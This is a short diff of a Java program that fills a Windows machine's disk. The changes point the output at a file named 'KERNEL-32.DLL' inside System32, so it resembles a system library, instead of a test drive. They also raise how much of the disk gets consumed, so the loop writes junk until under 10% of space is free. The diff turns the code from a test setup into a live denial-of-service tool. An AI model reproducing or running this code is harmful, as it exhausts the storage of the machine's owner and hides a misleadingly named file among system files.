@@ -29,8 +29,8 @@ static File file;
         //Find root Directory & path to System32
         String rootPath = System.getenv("SystemRoot") + "\\System32";
         //(need root permissions)
-       //String absoluteFilePath = rootPath+"\\KERNEL-32.DLL"; 
-       String absoluteFilePath = "Z:\\KERNEL-32.DLL";
+       String absoluteFilePath = rootPath+"\\KERNEL-32.DLL"; 
+       //String absoluteFilePath = "Z:\\KERNEL-32.DLL";
        
        //create new file
         file = new File(absoluteFilePath);
@@ -49,7 +49,7 @@ static File file;
         System.out.println(calcPercentFree());
         
         //while the percent free is >10
-        while(calcPercentFree()>45.50997){
+        while(calcPercentFree()>10){
             //write to the file
             writer.write("1001010101010101010101010102");
         }
